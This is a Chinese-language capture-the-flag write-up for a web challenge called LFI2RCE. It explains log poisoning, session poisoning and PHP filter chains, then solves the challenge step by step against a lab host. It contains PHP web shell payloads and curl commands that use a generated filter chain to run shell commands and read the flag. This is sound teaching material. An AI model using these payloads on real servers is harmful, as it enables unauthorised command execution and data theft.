#Web

## 題目
**LFI2RCE**
給了一個網址，點開來
![[W1-10_web.png|416]]

### LFI2RCE
將 Local File Inclusion（LFI）升級為遠端程式碼執行漏洞（Remote Code Execution, RCE）的攻擊，當網站允許攻擊者控制 LFI 時，可以將惡意程式碼寫入伺服器上的某些特定檔案，再利用 LFI 引入，促使伺服器解析並執行惡意指令
#####  常見攻擊手法
- **Log Poisoning**：攻擊者向伺服器發送包含惡意 PHP 程式碼（ex:  `<?php system($_GET['cmd']); ?>`）的請求讓伺服器記錄到系統日誌中，再用 LFI 讀取日誌檔觸發
- **PHP Session Poisoning**：網站使用 PHP Session 且攻擊者可以控制 Session 中的內容時，攻擊者將惡意程式碼注入 Session 變數中，再用 LFI 讀取伺服器上的 Session 暫存檔觸發
- **PHP 偽協議與過濾器鏈（PHP Wrappers & Filter Chain）**：利用 PHP 偽協議 / PHP Filter Chain 將輸入轉為程式碼執行，透過 LFI 參數構造出包含惡意 Payload 的記憶體區塊

## 解題
1. 觀察網頁
	- 點 Cappo 有提示："flag is in root dir"，但沒有說明檔案名稱
	- php 含有 `include`
	- 沒有上傳檔案或輸入字串的地方
2. 題目 LFI2RCE -> 考慮重寫一個已確定存在檔案（ex: `./page/apple.php`），利用工具 [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) 產生 慾寫入程式（ex: ```<?=`$_GET[0]`;?> ```）的 filter chain
   ```bash
   python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>'
   ```
   ![[W1-10_filter-chain.png]]
   第二行 `php://...` 開始為 filter chain
   可以設定一個環境變數 `CHAIN` 避免手動複製錯誤
   ```
   CHAIN=$(python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;?>' | tail -n 1)
   ```
3. 替換 `$_GET[0]` 的指令為 `id` 進行測試
   ```powershell
   curl -sG "http://chals1:20009/" \
	  --data-urlencode "page=$CHAIN" \
	  --data-urlencode "0=id" \
	  --output 
   ```
   ![[W1-10_id.png]]
   可以從大量雜訊中找到 id 指令執行成功
4. 依照提示列出根目錄
   ```powershell
   curl -sG "http://chals1:20009/"   --data-urlencode "page=$CHAIN"   --data-urlencode "0=ls -la /"   --output -
   ```
   ![[W1-10_root.png|458]]
5. 讀取檔案
   ```powershell
    curl -sG "http://chals1:20009/"   --data-urlencode "page=$CHAIN"   --data-urlencode "0=grep "CTF"  /flag_23fb1b3"   --output -
   ```
   ![[W1-10_flag.png|454]]
6. flag = `CTF{lfi_worldend_71811e6397e40639e10f5dd8}`